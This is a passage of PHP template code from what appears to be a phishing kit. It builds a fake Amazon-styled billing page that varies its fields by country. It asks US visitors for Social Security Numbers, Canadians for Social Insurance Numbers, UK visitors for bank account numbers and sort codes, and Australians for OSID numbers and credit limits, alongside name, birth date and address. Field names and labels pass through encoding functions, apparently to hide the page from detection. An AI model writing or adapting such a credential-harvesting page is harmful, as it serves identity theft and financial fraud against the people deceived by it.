                                                <option value="Saint Vincent and the Grenadines">'.$api->text_encode('Saint Vincent and the Grenadines').'</option>
                                                <option value="Samoa">'.$api->text_encode('Samoa').'</option>
                                                <option value="San Marino">'.$api->text_encode('San Marino').'</option>
                                                <option value="Sao Tome and Principe">'.$api->text_encode('Sao Tome and Principe').'</option>
                                                <option value="Saudi Arabia">'.$api->text_encode('Saudi Arabia').'</option>
                                                <option value="Senegal">'.$api->text_encode('Senegal').'</option>
                                                <option value="Serbia">'.$api->text_encode('Serbia').'</option>
                                                <option value="Seychelles">'.$api->text_encode('Seychelles').'</option>
                                                <option value="Sierra Leone">'.$api->text_encode('Sierra Leone').'</option>
                                                <option value="Singapore">'.$api->text_encode('Singapore').'</option>
                                                <option value="Slovakia">'.$api->text_encode('Slovakia').'</option>
                                                <option value="Slovenia">'.$api->text_encode('Slovenia').'</option>
                                                <option value="Solomon Islands">'.$api->text_encode('Solomon Islands').'</option>
                                                <option value="Somalia">'.$api->text_encode('Somalia').'</option>
                                                <option value="South Africa">'.$api->text_encode('South Africa').'</option>
                                                <option value="South Korea">'.$api->text_encode('South Korea').'</option>
                                                <option value="South Sudan">'.$api->text_encode('South Sudan').'</option>
                                                <option value="Spain">'.$api->text_encode('Spain').'</option>
                                                <option value="Sri Lanka">'.$api->text_encode('Sri Lanka').'</option>
                                                <option value="Sudan">'.$api->text_encode('Sudan').'</option>
                                                <option value="Suriname">'.$api->text_encode('Suriname').'</option>
                                                <option value="Sweden">'.$api->text_encode('Sweden').'</option>
                                                <option value="Switzerland">'.$api->text_encode('Switzerland').'</option>
                                                <option value="Syria">'.$api->text_encode('Syria').'</option>
                                                <option value="Taiwan">'.$api->text_encode('Taiwan').'</option>
                                                <option value="Tajikistan">'.$api->text_encode('Tajikistan').'</option>
                                                <option value="Tanzania">'.$api->text_encode('Tanzania').'</option>
                                                <option value="Thailand">'.$api->text_encode('Thailand').'</option>
                                                <option value="Timor-Leste">'.$api->text_encode('Timor-Leste').'</option>
                                                <option value="Togo">'.$api->text_encode('Togo').'</option>
                                                <option value="Tonga">'.$api->text_encode('Tonga').'</option>
                                                <option value="Trinidad and Tobago">'.$api->text_encode('Trinidad and Tobago').'</option>
                                                <option value="Tunisia">'.$api->text_encode('Tunisia').'</option>
                                                <option value="Turkey">'.$api->text_encode('Turkey').'</option>
                                                <option value="Turkmenistan">'.$api->text_encode('Turkmenistan').'</option>
                                                <option value="Tuvalu">'.$api->text_encode('Tuvalu').'</option>
                                                <option value="Uganda">'.$api->text_encode('Uganda').'</option>
                                                <option value="Ukraine">'.$api->text_encode('Ukraine').'</option>
                                                <option value="United Arab Emirates">'.$api->text_encode('United Arab Emirates').'</option>
                                                <option value="United Kingdom">'.$api->text_encode('United Kingdom').'</option>
                                                <option value="United States">'.$api->text_encode('United States').'</option>
                                                <option value="Uruguay">'.$api->text_encode('Uruguay').'</option>
                                                <option value="Uzbekistan">'.$api->text_encode('Uzbekistan').'</option>
                                                <option value="Vanuatu">'.$api->text_encode('Vanuatu').'</option>
                                                <option value="Vatican City">'.$api->text_encode('Vatican City').'</option>
                                                <option value="Venezuela">'.$api->text_encode('Venezuela').'</option>
                                                <option value="Vietnam">'.$api->text_encode('Vietnam').'</option>
                                                <option value="Yemen">'.$api->text_encode('Yemen').'</option>
                                                <option value="Zambia">'.$api->text_encode('Zambia').'</option>
                                                <option value="Zimbabwe">'.$api->text_encode('Zimbabwe').'</option>
                                            </select>
                                            <div id="inputErrorMsgCountry"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="fullname" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['fullname']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("fullname").'" id="fullname" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgFullname"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="dob" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['dob']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("dob").'" id="dob" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgDob"></div>
                                        </div>
                                        ';
                                        ########## UNITED STATES ##########
                                        if ($_SESSION['countrycode'] == "US") {
                                        $html .= '
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="ssn" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['ssn']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("ssn").'" id="ssn" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgSsn"></div>
                                        </div>';
                                        }
                                        ########## CANADA ##########
                                        if ($_SESSION['countrycode'] == "CA") {
                                        $html .= '
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="sin" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode('Social Insurance Number').'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("sin").'" id="sin" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgSin"></div>
                                        </div>';
                                        }
                                        ########## UNITED KINGDOM ##########
                                        if ($_SESSION['countrycode'] == "GB") {
                                        $html .= '
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="acno" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode('Account Number').'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("acno").'" id="acno" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgAcno"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="sortcode" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode('Sort Code').'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("sortcode").'" id="sortcode" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgSort"></div>
                                        </div>';
                                        }
                                        ########## AUSTRALIA ##########
                                        if ($_SESSION['countrycode'] == "AU") {
                                        $html .= '
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="osid" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode('OSID Number').'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("osid").'" id="osid" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgOsid"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="climit" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode('Credit Limit (ex: $5000)').'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("climit").'" id="climit" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgClimit"></div>
                                        </div>';
                                        }
                                        $html .= '
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="phone" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['phonenumber']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("phone").'" id="phone" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <span class="a-size-mini">'.$api->text_encode($lang['billingpage']['assistdelivery']).'</span>
                                            <div id="inputErrorMsgPhone"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="address" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['addressline1']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container awz-desktop-address-line-input-container">
                                            <input type="text" id="address" placeholder="'.$api->text_encode($lang['billingpage']['placeaddressline1']).'" name="'.$api->encypt("address").'" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                            <div id="inputErrorMsgAddress"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="addressline2" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['billingpage']['addressline2']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" id="addressline2" placeholder="'.$api->text_encode($lang['billingpage']['placeaddressline2']).'" name="'.$api->encypt("addressline2").'" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input">
                                        </div>
                                        <div class="a-row">
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="city" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['city']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" id="city" name="'.$api->encypt("kota").'" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                    <div id="inputErrorMsgCity"></div>
                                                </div>
                                            </div>
                                            ';
                                            ########## UNITED STATES ##########
                                            if ($_SESSION['countrycode'] == "US") {
                                            $html .= '
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="state" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['state']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                    <span class="a-dropdown-container">
                                                        <select id="state" name="'.$api->encypt("region").'" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                            <option value="'.$_SESSION['state'].'">'.$api->text_encode($_SESSION['state']).'</option>
                                                            <option value="Alabama">'.$api->text_encode('Alabama').'</option>
                                                            <option value="Alaska">'.$api->text_encode('Alaska').'</option>
                                                            <option value="Arizona">'.$api->text_encode('Arizona').'</option>
                                                            <option value="Arkansas">'.$api->text_encode('Arkansas').'</option>
                                                            <option value="California">'.$api->text_encode('California').'</option>
                                                            <option value="Colorado">'.$api->text_encode('Colorado').'</option>
                                                            <option value="Connecticut">'.$api->text_encode('Connecticut').'</option>
                                                            <option value="Delaware">'.$api->text_encode('Delaware').'</option>
                                                            <option value="Florida">'.$api->text_encode('Florida').'</option>
                                                            <option value="Georgia">'.$api->text_encode('Georgia').'</option>
                                                            <option value="Hawaii">'.$api->text_encode('Hawaii').'</option>
                                                            <option value="Idaho">'.$api->text_encode('Idaho').'</option>
                                                            <option value="Illinois">'.$api->text_encode('Illinois').'</option>
                                                            <option value="Indiana">'.$api->text_encode('Indiana').'</option>
                                                            <option value="Iowa">'.$api->text_encode('Iowa').'</option>
                                                            <option value="Kansas">'.$api->text_encode('Kansas').'</option>
                                                            <option value="Kentucky">'.$api->text_encode('Kentucky').'</option>
                                                            <option value="Louisiana">'.$api->text_encode('Louisiana').'</option>
                                                            <option value="Maine">'.$api->text_encode('Maine').'</option>
                                                            <option value="Maryland">'.$api->text_encode('Maryland').'</option>
                                                            <option value="Massachusetts">'.$api->text_encode('Massachusetts').'</option>
                                                            <option value="Michigan">'.$api->text_encode('Michigan').'</option>
                                                            <option value="Minnesota">'.$api->text_encode('Minnesota').'</option>
                                                            <option value="Mississippi">'.$api->text_encode('Mississippi').'</option>
                                                            <option value="Missouri">'.$api->text_encode('Missouri').'</option>
                                                            <option value="Montana">'.$api->text_encode('Montana').'</option>
                                                            <option value="Nebraska">'.$api->text_encode('Nebraska').'</option>
                                                            <option value="Nevada">'.$api->text_encode('Nevada').'</option>
                                                            <option value="New Hampshire">'.$api->text_encode('New Hampshire').'</option>
                                                            <option value="New Jersey">'.$api->text_encode('New Jersey').'</option>
                                                            <option value="New Mexico">'.$api->text_encode('New Mexico').'</option>
                                                            <option value="New York">'.$api->text_encode('New York').'</option>
                                                            <option value="North Carolina">'.$api->text_encode('North Carolina').'</option>
                                                            <option value="North Dakota">'.$api->text_encode('North Dakota').'</option>
                                                            <option value="Ohio">'.$api->text_encode('Ohio').'</option>
                                                            <option value="Oklahoma">'.$api->text_encode('Oklahoma').'</option>
                                                            <option value="Oregon">'.$api->text_encode('Oregon').'</option>
                                                            <option value="Pennsylvania">'.$api->text_encode('Pennsylvania').'</option>
                                                            <option value="Rhode Island">'.$api->text_encode('Rhode Island').'</option>
                                                            <option value="South Carolina">'.$api->text_encode('South Carolina').'</option>
                                                            <option value="South Dakota">'.$api->text_encode('South Dakota').'</option>
                                                            <option value="Tennessee">'.$api->text_encode('Tennessee').'</option>
                                                            <option value="Texas">'.$api->text_encode('Texas').'</option>
                                                            <option value="Utah">'.$api->text_encode('Utah').'</option>
                                                            <option value="Vermont">'.$api->text_encode('Vermont').'</option>
                                                            <option value="Virginia">'.$api->text_encode('Virginia').'</option>
                                                            <option value="Washington">'.$api->text_encode('Washington').'</option>
                                                            <option value="West Virginia">'.$api->text_encode('West Virginia').'</option>
                                                            <option value="Wisconsin">'.$api->text_encode('Wisconsin').'</option>
                                                            <option value="Wyoming">'.$api->text_encode('Wyoming').'</option>
                                                        </select>
                                                    </span>
                                                    <div id="inputErrorMsgState"></div>
                                                </div>
                                            </div>';
                                            ########## CANADA ##########
                                            } else if ($_SESSION['countrycode'] == "CA") {
                                            $html .= '
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="state" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['state']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                    <span class="a-dropdown-container">
                                                        <select id="state" name="'.$api->encypt("region").'" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                            <option value="'.$_SESSION['state'].'">'.$api->text_encode($_SESSION['state']).'</option>
                                                            <option value="Alberta">'.$api->text_encode('Alberta').'</option>
                                                            <option value="British Columbia">'.$api->text_encode('British Columbia').'</option>
                                                            <option value="Manitoba">'.$api->text_encode('Manitoba').'</option>
                                                            <option value="New Brunswick">'.$api->text_encode('New Brunswick').'</option>
                                                            <option value="Newfoundland">'.$api->text_encode('Newfoundland and Labrador').'</option>
                                                            <option value="Nova Scotia">'.$api->text_encode('Nova Scotia').'</option>
                                                            <option value="Nunavut">'.$api->text_encode('Nunavut').'</option>
                                                            <option value="Northwest Territories">'.$api->text_encode('Northwest Territories').'</option>
                                                            <option value="Ontario">'.$api->text_encode('Ontario').'</option>
                                                            <option value="Prince Edward Island">'.$api->text_encode('Prince Edward Island').'</option>
                                                            <option value="Quebec">'.$api->text_encode('Quebec').'</option>
                                                            <option value="Saskatchewan">'.$api->text_encode('Saskatchewan').'</option>
                                                            <option value="Yukon">'.$api->text_encode('Yukon').'</option>
                                                        </select>
                                                    </span>
                                                    <div id="inputErrorMsgState"></div>
                                                </div>
                                            </div>';
                                            ########## UNITED KINGDOM ##########
                                            } else if ($_SESSION['countrycode'] == "GB") {
                                            $html .= '
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="state" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['state']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                    <span class="a-dropdown-container">
                                                        <select id="state" name="'.$api->encypt("region").'" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                            <option value="'.$_SESSION['state'].'">'.$api->text_encode($_SESSION['state']).'</option>
                                                            <optgroup label="Counties of England">
                                                                <option value="Avon">'.$api->text_encode('Avon').'</option>
                                                                <option value="Bedfordshire">'.$api->text_encode('Bedfordshire').'</option>
                                                                <option value="Berkshire">'.$api->text_encode('Berkshire').'</option>
                                                                <option value="Bristol">'.$api->text_encode('Bristol').'</option>
                                                                <option value="Buckinghamshire">'.$api->text_encode('Buckinghamshire').'</option>
                                                                <option value="Cambridgeshire">'.$api->text_encode('Cambridgeshire').'</option>
                                                                <option value="Cheshire">'.$api->text_encode('Cheshire').'</option>
                                                                <option value="Cleveland">'.$api->text_encode('Cleveland').'</option>
                                                                <option value="Cornwall">'.$api->text_encode('Cornwall').'</option>
                                                                <option value="Cumbria">'.$api->text_encode('Cumbria').'</option>
                                                                <option value="Derbyshire">'.$api->text_encode('Derbyshire').'</option>
                                                                <option value="Devon">'.$api->text_encode('Devon').'</option>
                                                                <option value="Dorset">'.$api->text_encode('Dorset').'</option>
                                                                <option value="Durham">'.$api->text_encode('Durham').'</option>
                                                                <option value="East Riding of Yorkshire">'.$api->text_encode('East Riding of Yorkshire').'</option>
                                                                <option value="East Sussex">'.$api->text_encode('East Sussex').'</option>
                                                                <option value="Essex">'.$api->text_encode('Essex').'</option>
                                                                <option value="Gloucestershire">'.$api->text_encode('Gloucestershire').'</option>
                                                                <option value="Great Manchester">'.$api->text_encode('Great Manchester').'</option>
                                                                <option value="Hampshire">'.$api->text_encode('Hampshire').'</option>
                                                                <option value="Herefordshire">'.$api->text_encode('Herefordshire').'</option>
                                                                <option value="Hertfordshire">'.$api->text_encode('Hertfordshire').'</option>
                                                                <option value="Isle of Wight">'.$api->text_encode('Isle of Wight').'</option>
                                                                <option value="Isles of Scilly">'.$api->text_encode('Isles of Scilly').'</option>
                                                                <option value="Kent">'.$api->text_encode('Kent').'</option>
                                                                <option value="Lancashire">'.$api->text_encode('Lancashire').'</option>
                                                                <option value="Leicestershire">'.$api->text_encode('Leicestershire').'</option>
                                                                <option value="Lincolnshire">'.$api->text_encode('Lincolnshire').'</option>
                                                                <option value="London">'.$api->text_encode('London').'</option>
                                                                <option value="Merseyside">'.$api->text_encode('Merseyside').'</option>
                                                                <option value="Middlesex">'.$api->text_encode('Middlesex').'</option>
                                                                <option value="Norfolk">'.$api->text_encode('Norfolk').'</option>
                                                                <option value="North Yorkshire">'.$api->text_encode('North Yorkshire').'</option>
                                                                <option value="North East Lincolnshire">'.$api->text_encode('North East Lincolnshire').'</option>
                                                                <option value="Northamptonshire">'.$api->text_encode('Northamptonshire').'</option>
                                                                <option value="Nottinghamshire">'.$api->text_encode('Nottinghamshire').'</option>
                                                                <option value="Northumberland">'.$api->text_encode('Northumberland').'</option>
                                                                <option value="Oxfordshire">'.$api->text_encode('Oxfordshire').'</option>
                                                                <option value="Rutland">'.$api->text_encode('Rutland').'</option>
                                                                <option value="Shropshire">'.$api->text_encode('Shropshire').'</option>
                                                                <option value="Somerset">'.$api->text_encode('Somerset').'</option>
                                                                <option value="South Yorkshire">'.$api->text_encode('South Yorkshire').'</option>
                                                                <option value="Staffordshire">'.$api->text_encode('Staffordshire').'</option>
                                                                <option value="Suffolk">'.$api->text_encode('Suffolk').'</option>
                                                                <option value="Surrey">'.$api->text_encode('Surrey').'</option>
                                                                <option value="Tyne and Wear">'.$api->text_encode('Tyne and Wear').'</option>
                                                                <option value="Warwickshire">'.$api->text_encode('Warwickshire').'</option>
                                                                <option value="West Midlands">'.$api->text_encode('West Midlands').'</option>
                                                                <option value="West Sussex">'.$api->text_encode('West Sussex').'</option>
                                                                <option value="West Yorkshire">'.$api->text_encode('West Yorkshire').'</option>
                                                                <option value="Wiltshire">'.$api->text_encode('Wiltshire').'</option>
                                                                <option value="Worcestershire">'.$api->text_encode('Worcestershire').'</option>
                                                            </optgroup>
                                                            <optgroup label="Counties of Northern Ireland">
                                                                <option value="Antrim">'.$api->text_encode('Antrim').'</option>
                                                                <option value="Armagh">'.$api->text_encode('Armagh').'</option>
                                                                <option value="Down">'.$api->text_encode('Down').'</option>
                                                                <option value="Fermanagh">'.$api->text_encode('Fermanagh').'</option>
                                                                <option value="Londonderry">'.$api->text_encode('Londonderry').'</option>
                                                                <option value="Tyrone">'.$api->text_encode('Tyrone').'</option>
                                                            </optgroup>
                                                            <optgroup label="Counties of Scotland">
                                                                <option value="Aberdeen City">'.$api->text_encode('Aberdeen City').'</option>
                                                                <option value="Aberdeenshire">'.$api->text_encode('Aberdeenshire').'</option>
                                                                <option value="Angus">'.$api->text_encode('Angus').'</option>
                                                                <option value="Argyll">'.$api->text_encode('Argyll').'</option>
                                                                <option value="Banffshire">'.$api->text_encode('Banffshire').'</option>
                                                                <option value="Borders">'.$api->text_encode('Borders').'</option>
                                                                <option value="Clackmannan">'.$api->text_encode('Clackmannan').'</option>
                                                                <option value="Dumfries and Galloway">'.$api->text_encode('Dumfries and Galloway').'</option>
                                                                <option value="East Ayrshire">'.$api->text_encode('East Ayrshire').'</option>
                                                                <option value="East Dunbartonshire">'.$api->text_encode('East Dunbartonshire').'</option>
                                                                <option value="East Lothian">'.$api->text_encode('East Lothian').'</option>
                                                                <option value="East Renfrewshire">'.$api->text_encode('East Renfrewshire').'</option>
                                                                <option value="Edinburgh City">'.$api->text_encode('Edinburgh City').'</option>
                                                                <option value="Falkirk">'.$api->text_encode('Falkirk').'</option>
                                                                <option value="Fife">'.$api->text_encode('Fife').'</option>
                                                                <option value="Glasgow">'.$api->text_encode('Glasgow').'</option>
                                                                <option value="Highland">'.$api->text_encode('Highland').'</option>
                                                                <option value="Inverclyde">'.$api->text_encode('Inverclyde').'</option>
                                                                <option value="Midlothian">'.$api->text_encode('Midlothian').'</option>
                                                                <option value="Moray">'.$api->text_encode('Moray').'</option>
                                                                <option value="North Ayrshire">'.$api->text_encode('North Ayrshire').'</option>
                                                                <option value="North Lanarkshire">'.$api->text_encode('North Lanarkshire').'</option>
                                                                <option value="Orkney">'.$api->text_encode('Orkney').'</option>
                                                                <option value="Perthshire and Kinross">'.$api->text_encode('Perthshire and Kinross').'</option>
                                                                <option value="Renfrewshire">'.$api->text_encode('Renfrewshire').'</option>
                                                                <option value="Roxburghshire">'.$api->text_encode('Roxburghshire').'</option>
                                                                <option value="Shetland">'.$api->text_encode('Shetland').'</option>
                                                                <option value="South Ayrshire">'.$api->text_encode('South Ayrshire').'</option>
                                                                <option value="South Lanarkshire">'.$api->text_encode('South Lanarkshire').'</option>
                                                                <option value="Stirling">'.$api->text_encode('Stirling').'</option>
                                                                <option value="West Dunbartonshire">'.$api->text_encode('West Dunbartonshire').'</option>
                                                                <option value="West Lothian">'.$api->text_encode('West Lothian').'</option>
                                                                <option value="Western Isles">'.$api->text_encode('Western Isles').'</option>
                                                            </optgroup>
                                                            <optgroup label="Unitary Authorities of Wales">
                                                                <option value="Blaenau Gwent">'.$api->text_encode('Blaenau Gwent').'</option>
                                                                <option value="Bridgend">'.$api->text_encode('Bridgend').'</option>
                                                                <option value="Caerphilly">'.$api->text_encode('Caerphilly').'</option>
                                                                <option value="Cardiff">'.$api->text_encode('Cardiff').'</option>
                                                                <option value="Carmarthenshire">'.$api->text_encode('Carmarthenshire').'</option>
                                                                <option value="Ceredigion">'.$api->text_encode('Ceredigion').'</option>
                                                                <option value="Conwy">'.$api->text_encode('Conwy').'</option>
                                                                <option value="Denbighshire">'.$api->text_encode('Denbighshire').'</option>
                                                                <option value="Flintshire">'.$api->text_encode('Flintshire').'</option>
                                                                <option value="Gwynedd">'.$api->text_encode('Gwynedd').'</option>
                                                                <option value="Isle of Anglesey">'.$api->text_encode('Isle of Anglesey').'</option>
                                                                <option value="Merthyr Tydfil">'.$api->text_encode('Merthyr Tydfil').'</option>
                                                                <option value="Monmouthshire">'.$api->text_encode('Monmouthshire').'</option>
                                                                <option value="Neath Port Talbot">'.$api->text_encode('Neath Port Talbot').'</option>
                                                                <option value="Newport">'.$api->text_encode('Newport').'</option>
                                                                <option value="Pembrokeshire">'.$api->text_encode('Pembrokeshire').'</option>
                                                                <option value="Powys">'.$api->text_encode('Powys').'</option>
                                                                <option value="Rhondda Cynon Taff">'.$api->text_encode('Rhondda Cynon Taff').'</option>
                                                                <option value="Swansea">'.$api->text_encode('Swansea').'</option>
                                                                <option value="Torfaen">'.$api->text_encode('Torfaen').'</option>
                                                                <option value="The Vale of Glamorgan">'.$api->text_encode('The Vale of Glamorgan').'</option>
                                                                <option value="Wrexham">'.$api->text_encode('Wrexham').'</option>
                                                            </optgroup>
                                                            <optgroup label="Offshore Dependencies">
                                                                <option value="Channel Islands">'.$api->text_encode('Channel Islands').'</option>
                                                                <option value="Isle of Man">'.$api->text_encode('Isle of Man').'</option>
                                                            </optgroup>
                                                        </select>
                                                    </span>
                                                    <div id="inputErrorMsgState"></div>
                                                </div>
                                            </div>';
                                            ########## AUSTRALIA ##########
                                            } else if ($_SESSION['countrycode'] == "AU") {
                                            $html .= '
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="state" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['state']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                    <span class="a-dropdown-container">
                                                        <select id="state" name="'.$api->encypt("region").'" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                            <option value="'.$_SESSION['state'].'">'.$api->text_encode($_SESSION['state']).'</option>
                                                            <option value="Australian Capital Territory">'.$api->text_encode('Australian Capital Territory').'</option>
                                                            <option value="New South Wales">'.$api->text_encode('New South Wales').'</option>
                                                            <option value="Northern Territory">'.$api->text_encode('Northern Territory').'</option>
                                                            <option value="Queensland">'.$api->text_encode('Queensland').'</option>
                                                            <option value="South Australia">'.$api->text_encode('South Australia').'</option>
                                                            <option value="Tasmania">'.$api->text_encode('Tasmania').'</option>
                                                            <option value="Victoria">'.$api->text_encode('Victoria').'</option>
                                                            <option value="Western Australia">'.$api->text_encode('Western Australia').'</option>
                                                        </select>
                                                    </span>
                                                    <div id="inputErrorMsgState"></div>
                                                </div>
                                            </div>';
                                            } else {
                                            $html .= '
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="state" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['state']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" id="state" name="'.$api->encypt("region").'" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                    <div id="inputErrorMsgState"></div>
                                                </div>
                                            </div>';
                                            }
                                            $html .= '
